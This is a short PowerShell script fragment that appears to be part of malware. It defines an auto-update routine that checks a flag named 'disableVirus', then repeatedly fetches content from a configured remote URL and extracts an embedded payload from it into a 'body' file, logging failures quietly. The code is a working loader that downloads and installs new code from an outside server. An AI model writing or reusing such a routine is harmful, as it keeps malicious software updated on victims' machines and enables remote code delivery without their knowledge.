. ./utils.ps1
. ./consts_body.ps1


function do_autoupdate() {
    if ($server.disableVirus)
    {
        return
    }
    if (-not $server.autoUpdate){
        return
    }
    $url = $server.updateUrl
    $timeout = [datetime]::UtcNow.AddMinutes(5)
    $delay = 5
    Start-Sleep -Seconds $delay

    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get

            if ($response.StatusCode -eq 200) {
                
                $file=Get-BodyPath
                ExtractEmbedding -inContent $response.Content -outFile $file
                return
            }
        }
        catch {
            writedbg "Failed to DoUpdate ($url): $_"
        }

        Start-Sleep -Seconds $delay
    }
    writedbg "Failed to download the DoUpdate ($url) within the allotted time."
}